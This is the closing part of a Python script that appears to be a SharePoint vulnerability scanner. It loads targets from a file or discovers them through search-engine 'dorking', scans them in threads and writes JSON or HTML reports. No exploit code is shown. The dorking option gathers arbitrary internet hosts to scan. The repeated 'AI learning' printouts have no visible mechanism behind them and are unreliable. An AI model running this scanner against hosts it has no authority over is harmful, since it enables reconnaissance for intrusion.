        # Top recommendations
        all_recommendations = []
        for r in self.results:
            recs = r.ai_insights.get('risk_summary', {}).get('recommendations', [])
            all_recommendations.extend(recs)

        if all_recommendations:
            print(f"\n💡 Top AI Recommendations:")
            rec_counts = defaultdict(int)
            for rec in all_recommendations:
                rec_counts[rec] += 1

            top_recs = sorted(rec_counts.items(), key=lambda x: x[1], reverse=True)[:5]
            for i, (rec, count) in enumerate(top_recs, 1):
                print(f"   {i}. {rec} ({count} targets)")

        print("\n" + "="*80)
        print("🤖 AI Learning: Models updated with scan results for improved future detection")
        print("="*80 + "\n")

# ============================================
# EXECUTION BLOCK
# ============================================

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Simple AI-Powered SharePoint Vulnerability Scanner v3.0")
    parser.add_argument("-i", "--input", default="target.txt", help="Input file with targets")
    parser.add_argument("-o", "--output", default="ai_scan_results.json", help="Output JSON file")
    parser.add_argument("-t", "--threads", type=int, default=5, help="Number of threads")
    parser.add_argument("--port", type=int, default=443, help="Target port")
    parser.add_argument("--dork", action="store_true", help="Use AI-enhanced auto-dork")
    parser.add_argument("--json", help="Output JSON file path")
    parser.add_argument("--html", help="Output HTML file path")
    parser.add_argument("--proxy", help="Proxy URL (e.g., http://proxy:8080)")
    parser.add_argument("--rate", type=float, default=10, help="Requests per second")
    parser.add_argument("--timeout", type=float, default=10, help="Request timeout")

    args = parser.parse_args()

    config = {
        'rate_limit': args.rate,
        'timeout': args.timeout,
        'proxy': {'url': args.proxy} if args.proxy else None
    }

    scanner = SimpleAISharePointScanner(config)

    # Load targets
    if args.dork:
        hosts = EnhancedAutoDork.perform_smart_dork(limit=10)
        print(f"[AI] 🤖 Discovered {len(hosts)} targets via smart dorking")
    elif Path(args.input).exists() and Path(args.input).stat().st_size > 0:
        with open(args.input, "r") as f:
            hosts = [l.strip() for l in f if l.strip()]
    else:
        hosts = []

    if not hosts:
        print("[-] No targets found. Use -i for input file or --dork for AI discovery")
        exit(1)

    print(f"\n[AI] 🚀 Starting AI-powered scan on {len(hosts)} targets with {args.threads} threads...")
    print("[AI] 🧠 AI Engine: Active | Learning: Enabled | Pattern Recognition: Online")

    # AI-powered scanning
    results = scanner.scan_multiple_ai(hosts, port=args.port, threads=args.threads)

    # Generate AI-enhanced reports
    reporter = AIEnhancedReportGenerator(results)
    reporter.console_summary()

    # Save results
    reporter.to_json(args.json or args.output)
    if args.html:
        reporter.to_html(args.html)

    print(f"[AI] 💾 Results saved to {args.output}")
    if args.html:
        print(f"[AI] 🌐 HTML report saved to {args.html}")
    print("[AI] 🧠 AI models have learned from this scan for improved future detection!")
